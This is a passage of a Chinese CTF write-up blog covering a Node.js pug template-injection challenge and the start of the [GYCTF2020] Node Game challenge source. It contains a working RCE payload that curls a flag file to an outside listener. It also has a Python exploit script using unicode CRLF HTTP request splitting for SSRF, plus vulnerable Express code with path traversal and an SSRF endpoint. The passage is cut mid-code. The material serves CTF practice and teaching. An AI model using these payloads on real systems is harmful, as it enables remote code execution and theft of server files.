</span></span></code></pre></div><p>写一个外带flag的payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>-</span><span style=color:#111>[][</span><span style=color:#d88200>&#34;constructor&#34;</span><span style=color:#111>][</span><span style=color:#d88200>&#34;constructor&#34;</span><span style=color:#111>](</span><span style=color:#d88200>&#34;console.log(this.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl 172.19.0.1:8888 -X POST -d @flag.txt&#39;))&#34;</span><span style=color:#111>)()</span>
</span></span></code></pre></div><p>我根据这位大佬的py2版<a href=https://ctftime.org/writeup/18293>exp.py</a>写了一个py3版本的，并且改的简洁了一些（有了一些通用性，但是由于还是部分unicode编码，总体上不如全编码的稳</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>requests.utils</span> <span style=color:#f92672>import</span> <span style=color:#111>quote</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>charset</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>SPACE</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u0120</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>CRLF</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u010d\u010a</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>SLASH</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u012f</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 仅对字母进行编码</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>str2Oct</span><span style=color:#111>(</span><span style=color:#111>str</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>str</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>charset</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>r</span> <span style=color:#f92672>+=</span> <span style=color:#d88200>&#39;</span><span style=color:#8045ff>\\</span><span style=color:#d88200>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>oct</span><span style=color:#111>(</span><span style=color:#111>ord</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>))[</span><span style=color:#ae81ff>1</span><span style=color:#111>:]</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>r</span> <span style=color:#f92672>+=</span> <span style=color:#111>i</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;o&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>_pug</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;&#39;-[][&#34;constructor][&#34;constructor](&#34;console.log(this.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl http://ip:port/ -d @/flag.txt&#39;))&#34;)()&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>pug</span> <span style=color:#f92672>=</span> <span style=color:#111>str2Oct</span><span style=color:#111>(</span><span style=color:#111>_pug</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#34;&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;%22&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#39;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;%27&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(pug)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># print(quote(pug))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;&#39;&#39;amiz HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>GET /flag HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>x-forwarded-for: 127.0.0.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>adminauth: secretpassword
</span></span></span><span style=display:flex><span><span style=color:#d88200>pug: </span><span style=color:#d88200>{</span><span style=color:#111>pug</span><span style=color:#d88200>}</span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>test: &#39;&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39; &#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>SPACE</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>SLASH</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>CRLF</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>session</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>result</span> <span style=color:#f92672>=</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;url&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>quote</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#111>content</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>本地复现成功</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206192539624.png alt=image-20211206192539624></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206191832996.png alt=image-20211206191832996></p><h2 id=gyctf2020node-game>[GYCTF2020]Node Game</h2><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>path</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;path&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>http</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>pug</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;pug&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>morgan</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;morgan&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>multer</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;multer&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>multer</span><span style=color:#111>({</span><span style=color:#75af00>dest</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;./dist&#39;</span><span style=color:#111>}).</span><span style=color:#75af00>array</span><span style=color:#111>(</span><span style=color:#d88200>&#39;file&#39;</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>morgan</span><span style=color:#111>(</span><span style=color:#d88200>&#39;short&#39;</span><span style=color:#111>));</span>   <span style=color:#75715e>// 简化版日志
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/uploads&#34;</span><span style=color:#111>,</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span><span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;/uploads&#39;</span><span style=color:#111>)))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/template&#34;</span><span style=color:#111>,</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span><span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;/template&#39;</span><span style=color:#111>)))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>action</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>action</span><span style=color:#f92672>?</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>action</span><span style=color:#f92672>:</span><span style=color:#d88200>&#34;index&#34;</span><span style=color:#111>;</span> <span style=color:#75715e>// action参数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span> <span style=color:#75af00>action</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#111>)</span> <span style=color:#f92672>||</span> <span style=color:#75af00>action</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#d88200>&#34;\\&#34;</span><span style=color:#111>)</span> <span style=color:#111>){</span>    <span style=color:#75715e>// 不能有/ \
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Errrrr, You have been Blocked&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>file</span> <span style=color:#f92672>=</span> <span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;/template/&#39;</span><span style=color:#f92672>+</span> <span style=color:#75af00>action</span> <span style=color:#f92672>+</span><span style=color:#d88200>&#39;.pug&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>html</span> <span style=color:#f92672>=</span> <span style=color:#75af00>pug</span><span style=color:#111>.</span><span style=color:#75af00>renderFile</span><span style=color:#111>(</span><span style=color:#75af00>file</span><span style=color:#111>);</span>    <span style=color:#75715e>// 模板渲染
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>html</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/file_upload&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>connection</span><span style=color:#111>.</span><span style=color:#75af00>remoteAddress</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>obj</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>msg</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#d88200>&#39;127.0.0.1&#39;</span><span style=color:#111>))</span> <span style=color:#111>{</span>    <span style=color:#75715e>// 需要SSRF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>obj</span><span style=color:#111>.</span><span style=color:#75af00>msg</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;only admin&#39;s ip can use it&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>(</span><span style=color:#75af00>obj</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>files</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>].</span><span style=color:#75af00>path</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>data</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>obj</span><span style=color:#111>.</span><span style=color:#75af00>msg</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;upload failed&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>(</span><span style=color:#75af00>obj</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>var</span> <span style=color:#75af00>file_path</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;/uploads/&#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>files</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>].</span><span style=color:#75af00>mimetype</span> <span style=color:#f92672>+</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#111>;</span>   <span style=color:#75715e>// 路径确定 mimetype可控 路径穿越
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>var</span> <span style=color:#75af00>file_name</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>files</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>].</span><span style=color:#75af00>originalname</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>var</span> <span style=color:#75af00>dir_file</span> <span style=color:#f92672>=</span> <span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#75af00>file_path</span> <span style=color:#f92672>+</span> <span style=color:#75af00>file_name</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#75af00>file_path</span><span style=color:#111>)){</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>mkdirSync</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#75af00>file_path</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>                <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>obj</span><span style=color:#111>.</span><span style=color:#75af00>msg</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;file type error&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>(</span><span style=color:#75af00>obj</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span>                <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>writeFileSync</span><span style=color:#111>(</span><span style=color:#75af00>dir_file</span><span style=color:#111>,</span><span style=color:#75af00>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>obj</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>msg</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;upload success&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>filename</span><span style=color:#f92672>:</span> <span style=color:#75af00>file_path</span> <span style=color:#f92672>+</span> <span style=color:#75af00>file_name</span>
</span></span><span style=display:flex><span>                <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>obj</span><span style=color:#111>.</span><span style=color:#75af00>msg</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;upload failed&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>stringify</span><span style=color:#111>(</span><span style=color:#75af00>obj</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/source&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span> <span style=color:#75715e>// 源码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>sendFile</span><span style=color:#111>(</span><span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;/template/source.txt&#39;</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/core&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>q</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>q</span><span style=color:#111>;</span>    <span style=color:#75715e>// q参数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>resp</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>q</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;http://localhost:8081/source?&#39;</span> <span style=color:#f92672>+</span> <span style=color:#75af00>q</span>   <span style=color:#75715e>// 可控端点
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>var</span> <span style=color:#75af00>trigger</span> <span style=color:#f92672>=</span> <span style=color:#75af00>blacklist</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>);</span>   <span style=color:#75715e>// 黑名单过滤
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>trigger</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>true</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&lt;p&gt;error occurs!&lt;/p&gt;&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>resp</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>resp</span><span style=color:#111>.</span><span style=color:#75af00>setEncoding</span><span style=color:#111>(</span><span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>resp</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;error&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>code</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#34;ECONNRESET&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Timeout occurs&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                            <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>resp</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>chunk</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#75af00>resps</span> <span style=color:#f92672>=</span> <span style=color:#75af00>chunk</span><span style=color:#111>.</span><span style=color:#75af00>toString</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>                            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>resps</span><span style=color:#111>);</span>
